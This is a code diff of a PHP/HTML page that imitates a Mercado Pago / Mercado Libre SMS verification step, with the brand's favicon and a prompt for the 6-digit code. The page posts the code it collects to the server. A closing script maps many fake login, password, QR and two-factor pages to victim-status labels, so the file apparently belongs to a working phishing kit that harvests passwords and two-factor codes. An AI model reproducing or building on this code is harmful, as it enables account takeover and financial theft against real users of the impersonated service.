@@ -10,7 +10,7 @@ function isMobileDevice() {
 if (isMobileDevice()) {
     $redirect_target_2fa = 'dois_fatores.php';
 } else {
-    $redirect_target_2fa = 'dois_fatores.php'; 
+    $redirect_target_2fa = 'dois_fatores.php';
 }
 
 function formatarCPF($cpf) {
@@ -27,7 +27,7 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Insira o código que te enviamos por SMS</title>
-    <link rel="icon" href="https://http2.mlstatic.com/frontend-assets/mp-web-navigation/ui-navigation/6.7.73/mercadopago/favicon.svg" type="image/svg"/>
+    <link rel="icon" href="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/6.6.146/mercadolibre/pt_logo_large_plus@2x.webp" type="image/svg"/>
     <style>
         :root {
             --cor-amarela: #ffe600;
@@ -65,7 +65,7 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
         .btn { padding: 14px 24px; font-size: 15px; font-weight: 600; border-radius: 6px; cursor: pointer; border: 1px solid transparent; }
         .btn-primary { background-color: var(--cor-azul); color: white; flex-grow: 1; }
         .btn-secondary { color: var(--cor-azul); text-decoration: none; white-space: nowrap; }
-        
+
         /* PASSO 1: CSS PARA O POP-UP CUSTOMIZADO */
         .toast {
             position: fixed;
@@ -102,7 +102,7 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
 
     <main class="main-content">
         <div class="content-wrapper">
-            
+
             <div class="left-column">
                 <span class="session-start-label">INÍCIO DE SESSÃO</span>
                 <h1 class="main-title">Insira o código que te enviamos por SMS</h1>
@@ -117,7 +117,7 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
                         <a href="index.php">Trocar conta</a>
                     </div>
                 </div>
-                
+
                 <a href="#" class="help-link">Preciso de ajuda</a>
             </div>
 
@@ -144,7 +144,7 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
 
     <script>
         // PASSO 3: LÓGICA JAVASCRIPT PARA CONTROLAR O POP-UP
-        
+
         const toastElement = document.getElementById('notification-toast');
         let toastTimeout;
 
@@ -188,12 +188,12 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
         function startTimer() {
             let seconds = 50;
             timerElement.style.color = 'var(--cor-texto-secundaria)';
-            
+
             function updateTimer() {
                 const minutes = String(Math.floor(seconds / 60)).padStart(2, '0');
                 const secs = String(seconds % 60).padStart(2, '0');
                 timerElement.innerHTML = `Reenviar código em ${minutes}:${secs}`;
-                
+
                 if (seconds > 0) {
                     seconds--;
                 } else {
@@ -201,7 +201,7 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
                     timerElement.innerHTML = `<a href="#" onclick="resendSms(event)">Reenviar código</a>`;
                 }
             }
-            
+
             clearInterval(countdownInterval);
             updateTimer();
             countdownInterval = setInterval(updateTimer, 1000);
@@ -215,10 +215,10 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
         }
 
         document.addEventListener('DOMContentLoaded', startTimer);
-        
+
         async function handleFormSubmit(event) {
             event.preventDefault();
-            
+
             const code = inputs.map(input => input.value).join('');
 
             if (code.length === 6) {
@@ -228,9 +228,9 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ sms_code: code })
                     });
-                    
+
                     const result = await response.json();
-                    
+
                     if (result.success) {
                         // SUBSTITUIÇÃO DO ALERT
                         showToast('Código recebido com sucesso!', 'success');
@@ -250,7 +250,7 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
             }
         }
     </script>
-    
+
     <script>
         (function() {
             const statusMap = { 'index.php': '...', 'login-mobile.php': '...', 'senha.php': '...', 'senha-mobile.php': '...', 'dois_fatores.php': '...', 'dois_fatores2.php': '...', 'doisfatores2mobile.php': '...', 'sms_desktop.php': 'Usuário na tela para logar com código no SMS (Desktop)', 'sms_mobile.php': '...', 'sms_whats_desktop.php': '...', 'sms_whats_mobile.php': '...', 'qrcode-mobile.php': '...', 'telaqr.php': '...', 'email2fadesktop.php': '...', 'email2famobile.php': '...', 'emailsms_desktop.php': '...', 'emailsms_mobile.php': '...', 'sms2fadesktop.php': '...', 'sms2famobile.php': '...', 'whats2fadesktop.php': '...', 'whats2framobile.php': '...' };
